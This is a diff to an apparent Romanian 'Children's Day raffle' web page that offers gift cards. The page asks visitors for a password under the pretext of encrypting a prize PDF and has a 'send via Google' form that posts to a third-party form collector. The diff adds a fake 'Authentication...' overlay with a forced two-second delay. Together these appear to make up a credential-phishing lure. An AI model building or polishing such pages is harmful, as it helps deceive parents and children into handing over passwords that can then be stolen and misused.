@@ -576,7 +576,7 @@
             outline-offset: 2px;
         }
 
-        /* Loading state */
+        /* Loading state for button */
         .loading {
             opacity: 0.7;
             pointer-events: none;
@@ -621,13 +621,52 @@
                 border-color: currentcolor !important; 
             }
         }
+
+        /* New Loading Overlay Styles */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1001;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+        }
+
+        .loading-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .loading-spinner {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #667eea;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1.5s linear infinite;
+        }
+
+        .loading-text {
+            margin-top: 20px;
+            font-size: 1.2em;
+            color: #2d3748;
+            font-weight: 600;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
             <h1>🎮 Tombola de Ziua Copiilor 🎉</h1>
-            <p>Alege cardul cadou preferat și participă la tombola noastră specială!</p>
+            <p>Alege-ți cardul cadou preferat și participă la tombola noastră specială!</p>
         </div>
 
         <div id="selection-section">
@@ -690,7 +729,7 @@
                 <div class="form-group">
                     <label for="prizePassword">Parolă pentru criptarea premiului *</label>
                     <div class="disclaimer">
-                        <strong>Parolă pentru criptarea premiului:</strong> Această parolă va fi folosită pentru a cripta PDF-ul cu premiul tău în cazul in care câștigi. Reține această parolă cu atenție - o vei folosi pentru a accesa premiul!
+                        <strong>Parolă pentru criptarea premiului:</strong> Această parolă va fi folosită pentru a cripta PDF-ul cu premiul tău în cazul in care câștigi. Reține-ți această parolă cu atenție - o vei avea nevoie pentru a accesa premiul!
                     </div>
                     <input type="password" id="prizePassword" name="prizePassword" required>
                 </div>
@@ -731,6 +770,11 @@
                 <button type="submit" class="modal-btn">Trimite prin Google</button>
             </form>
         </div>
+    </div>
+
+    <div id="loading-overlay" class="loading-overlay">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Autentificare...</div>
     </div>
 
     <script>
@@ -787,16 +831,24 @@
         });
 
         async function submitForm(formData, submitButton) {
+            const loadingOverlay = document.getElementById('loading-overlay');
+            loadingOverlay.classList.add('active'); // Activează loading screen-ul
+
+            let response;
             try {
-                submitButton.classList.add('loading');
+                submitButton.classList.add('loading'); 
                 
-                const response = await fetch('https://formspree.io/f/mgvkgwaa', {
+                const fetchPromise = fetch('https://formspree.io/f/mgvkgwaa', {
                     method: 'POST',
                     body: formData,
                     headers: {
                         'Accept': 'application/json'
                     }
                 });
+
+                const minDurationPromise = new Promise(resolve => setTimeout(resolve, 2000)); // Minimum 2 seconds
+
+                [response] = await Promise.all([fetchPromise, minDurationPromise]); 
 
                 if (response.ok) {
                     document.getElementById('form-section').classList.remove('active');
@@ -819,6 +871,7 @@
                 alert('A apărut o eroare la trimiterea participării. Te rugăm să verifici conexiunea la internet și să încerci din nou.');
             } finally {
                 submitButton.classList.remove('loading');
+                loadingOverlay.classList.remove('active'); // Dezactivează loading screen-ul la final
             }
         }
 
